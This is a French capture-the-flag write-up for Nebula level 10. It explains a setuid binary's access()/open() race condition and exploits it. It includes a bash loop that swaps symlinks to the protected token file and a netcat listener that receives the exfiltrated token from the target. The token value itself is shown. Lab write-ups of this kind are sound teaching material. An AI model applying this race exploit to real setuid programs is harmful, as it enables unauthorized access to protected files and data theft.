# Challenge 10

Voici l'intitulé du challenge : 
```
The setuid binary at /home/flag10/flag10 binary will upload any file given, as long as it meets the requirements of the access() system call.
To do this level, log in as the level10 account with the password level10. Files for this level can be found in /home/flag10.
```

Ainsi que le code source du challenge : 
```C
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>

int main(int argc, char **argv)
{
  char *file;
  char *host;

  if(argc < 3) {
      printf("%s file host\n\tsends file to host if you have access to it\n", argv[0]);
      exit(1);
  }

  file = argv[1];
  host = argv[2];

  if(access(argv[1], R_OK) == 0) {
      int fd;
      int ffd;
      int rc;
      struct sockaddr_in sin;
      char buffer[4096];

      printf("Connecting to %s:18211 .. ", host); fflush(stdout);

      fd = socket(AF_INET, SOCK_STREAM, 0);

      memset(&sin, 0, sizeof(struct sockaddr_in));
      sin.sin_family = AF_INET;
      sin.sin_addr.s_addr = inet_addr(host);
      sin.sin_port = htons(18211);

      if(connect(fd, (void *)&sin, sizeof(struct sockaddr_in)) == -1) {
          printf("Unable to connect to host %s\n", host);
          exit(EXIT_FAILURE);
      }

#define HITHERE ".oO Oo.\n"
      if(write(fd, HITHERE, strlen(HITHERE)) == -1) {
          printf("Unable to write banner to host %s\n", host);
          exit(EXIT_FAILURE);
      }
#undef HITHERE

      printf("Connected!\nSending file .. "); fflush(stdout);

      ffd = open(file, O_RDONLY);
      if(ffd == -1) {
          printf("Damn. Unable to open file\n");
          exit(EXIT_FAILURE);
      }

      rc = read(ffd, buffer, sizeof(buffer));
      if(rc == -1) {
          printf("Unable to read from file: %s\n", strerror(errno));
          exit(EXIT_FAILURE);
      }

      write(fd, buffer, rc);

      printf("wrote file!\n");

  } else {
      printf("You don't have access to %s\n", file);
  }
}
```

Fonctionnement du challenge :
1. On donne au fichier `/home/flag10/flag10` deux arguments : `file` et `host`
2. Si on a accès en lecture au fichier (utilisateur qui a lancé le chall) donné cela continue, sinon le programme s'arrête avec `You don't have access to <filename>`
3. Le programme initialise 3 valeurs :
    - `fd` qui correspond au file descriptor
    - `ffd` qui correspond à un deuxième file descriptor (qui sera ici un socket descriptor)
    - `rc` qui contiendra le contenu lu du fichier
4. Le programme initialise `sin` qui a pour structure `sockaddr_in` qui correspond à la structure d'une IPV4 stockée sur 4 octets.
5. On se connecte à `host` sur le port `18211`.
6. On initialise le `fd` avec un socket de connexion si cela marche et avec `-1` si la connection a échouée.
7. Le programme prépare `sin` en remplissant de valeur nulle (`0`) avec memset.
8. Le programme définit :
    - `sin.sin_family` : initialisé à IPV4
    - `sin.sin_addr.s_addr` : initialisé à l'hôte que l'on a donné en argument
    - `sin.sin_port` : initalisé au port `18211`
9. Le programme essaye de se connecter à l'host avec les paramètres définis ci dessus et fail avec `-1` si il n'y arrive pas.
10. Le programme définit `HITHERE` à `.oO Oo.\n` et essaye de l'envoyer à l'host. Si il n'y arrive pas il fail avec `-1`.
11. Une fois connecté et après avoir envoyé `HITHERE` le programme affiche : `Connected!\nSending file .. `.
12. Le programme stocke dans `ffd` le file descriptor du fichier lu et fail si il n'a pas les permissions (CETTE FOIS PERMISSION DU PROGRAMME grâce au bit suid).
13. Le contenu du fichier est lu et stocké dans `rc`.
14. Le contenu du fichier (stocké dans `rc`) est envoyé par le socket au client.
15. Le programme affiche `wrote file!\n`.


### Idée 

Comme la boucle qui vérifie *si on a accès en lecture au fichier donné* et l'ouverture du fichier sont séparés par plusieurs instructions je me demande si il n'est pas possible d'exploiter cela.

On donnerai donc un premier fichier `/tmp/readable` avec les permissions qui peut être lu par notre utilisateur, puis ensuite on change cela pour que le fichier lise le fichier désiré (ici le fichier `token`).

Comment faire cela ?

Encore une fois avec un script bash et des liens symboliques.
Idée : boucle infinie qui change un lien symbolique entre deux fichiers (celui sur lequel on a les permissions et le fichier `token`).

### Premier test

Je crée un fichier : `/tmp/readable`:
```bash
level10@nebula:/tmp$ cat readable 
Pas bon fichier :33
```

Mon script dans `/tmp/exploit`:
```bash
#!/bin/bash
while :
do 
    ln -s /tmp/readable /tmp/flag_link
    ln -s /home/flag10/token /tmp/flag_link
done
```

Je commence par tester pour voir si cela marche. Il me suffit de cat le lien symbolique `/tmp/flag_link` et je dois alterner entre `You don't have access to token` et `Pas bon fichier :33`.

J'ai un problème `ln: creating symbolic link /tmp/flag_link: File exists`.

Je décide alors d'écrire par dessus si jamais un lien existe déjà.

```bash
#!/bin/bash
while :
do 
    ln -sfn /tmp/readable /tmp/flag_link
    ln -sfn /home/flag10/token /tmp/flag_link
done
```

Et effectivement cela marche :
```bash
level10@nebula:/tmp$ cat flag_link 
cat: flag_link: Permission denied
level10@nebula:/tmp$ cat flag_link 
cat: flag_link: Permission denied
level10@nebula:/tmp$ cat flag_link 
Pas bon fichier :33
```

Il est l'heure de tester avec un reverse shell.

Sur ma machine je fais : 
```bash
cr0c0@0xCr0c0 > ~ > nc -lvnp 18211
listening on [any] 18211 ...
```

Puis dans un premier shell je fais : 

```bash
level10@nebula:/tmp$ ./exploit 
```

Et sur un dernier shell je lance mon exploit avec l'ip de ma machine (`192.168.163.40`).
```bash
level10@nebula:/home/flag10$ ./flag10 /tmp/flag_link 192.168.163.40

You don't have access to /tmp/flag_link
level10@nebula:/home/flag10$ ./flag10 /tmp/flag_link 192.168.163.40
Connecting to 192.168.163.40:18211 .. Connected!
Sending file .. wrote file!
```

Et BINGO sur ma machine j'obtiens :
```bash
cr0c0@0xCr0c0 > ~ > nc -lvnp 18211    
listening on [any] 18211 ...
connect to [192.168.163.40] from (UNKNOWN) [192.168.163.40] 54954
.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
```